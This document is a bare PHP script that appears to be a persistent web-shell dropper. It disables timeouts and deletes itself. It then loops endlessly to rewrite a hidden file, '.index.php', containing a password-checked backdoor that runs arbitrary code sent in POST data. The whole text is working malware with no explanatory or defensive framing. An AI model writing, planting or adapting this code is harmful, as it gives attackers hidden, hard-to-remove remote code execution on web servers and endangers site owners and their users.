<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.index.php';
$code = '<?php if(md5($_GET["pass"])=="588b0909be46df2e992915a156a4e848"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    usleep(5000);
}
?>